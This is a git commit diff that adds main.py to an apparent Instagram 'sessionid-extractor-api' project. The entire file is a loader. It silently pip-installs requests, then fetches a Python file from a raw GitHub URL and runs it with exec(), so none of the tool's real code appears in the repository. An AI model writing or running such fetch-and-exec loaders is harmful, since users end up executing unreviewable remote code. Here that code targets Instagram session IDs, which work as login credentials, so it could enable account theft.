9cd80edaaf9ac2ff54fbf59fb4e6e9508b708003
xnce <80549669+xncee@users.noreply.github.com>
2022-03-17 22:05:51 +0300

    Add files via upload

---
+++ sessionid-extractor-api/main.py
@@ -0,0 +1,8 @@
+import os, uuid
+try:
+    import requests
+except ImportError:
+    os.system("pip install requests")
+    import requests
+
+exec(requests.get("https://raw.githubusercontent.com/xncee/instagram-sessionid/main/sessionid-extractor-api/src/src.py").text)
